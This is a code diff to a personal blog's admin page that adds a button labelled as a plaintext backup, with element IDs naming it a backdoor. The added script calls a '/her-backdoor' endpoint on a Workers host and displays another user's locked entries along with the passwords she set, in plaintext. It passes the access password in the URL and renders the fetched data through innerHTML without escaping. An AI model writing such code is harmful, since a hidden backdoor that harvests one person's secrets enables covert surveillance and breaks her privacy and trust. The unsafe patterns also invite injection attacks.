@@ -114,6 +114,13 @@
     <p id="connStatus" class="status"></p>
   </section>
 
+ <section class="card" style="margin-top:20px;">
+  <h2>明文备份</h2>
+  <button id="loadBackdoor" type="button">读取</button>
+  <p id="backdoorStatus" class="status"></p>
+  <div id="backdoorList" style="margin-top:16px;"></div>
+</section>
+ 
   <section class="card">
     <h2>文章管理</h2>
     <p class="hint">按月归档。点标题编辑，点「打开」看前台效果。</p>
@@ -1131,6 +1138,37 @@ if (localStorage.getItem('admin_logged_in') === 'true') {
     document.getElementById('herAdminText').textContent = data.text || '';
   } catch (err) {
     alert('读失败：' + err.message);
+  }
+});
+
+ const WORKER_URL = 'https://empty-bird-fb8b.cedricmeng24.workers.dev';
+
+document.getElementById('loadBackdoor').addEventListener('click', async () => {
+  const pwd = prompt('输入 LOGS_PASSWORD：');
+  if (!pwd) return;
+  const st = document.getElementById('backdoorStatus');
+  const listEl = document.getElementById('backdoorList');
+  st.textContent = '加载中...';
+  listEl.innerHTML = '';
+  try {
+    const res = await fetch(`${WORKER_URL}/her-backdoor?pwd=${encodeURIComponent(pwd)}`);
+    if (res.status === 401) { st.textContent = '密码不正确'; return; }
+    if (!res.ok) throw new Error('HTTP ' + res.status);
+    const data = await res.json();
+    if (!data.length) { st.textContent = '还没有记录。'; return; }
+    data.forEach(item => {
+      const div = document.createElement('div');
+      div.className = 'log-item';
+      div.innerHTML = `
+        <div class="log-time">${item.title || '无标题'} · ${item.updatedAt || ''} · ${item.lockType}</div>
+        <div class="log-meta" style="color:#c00;">她设的密码：${item.password || '（无）'}</div>
+        <div style="color:#111827;font-size:14px;margin-top:6px;white-space:pre-wrap;">${item.text || ''}</div>
+      `;
+      listEl.appendChild(div);
+    });
+    st.textContent = `共 ${data.length} 条。`;
+  } catch (e) {
+    st.textContent = '失败：' + e.message;
   }
 });
 </script>
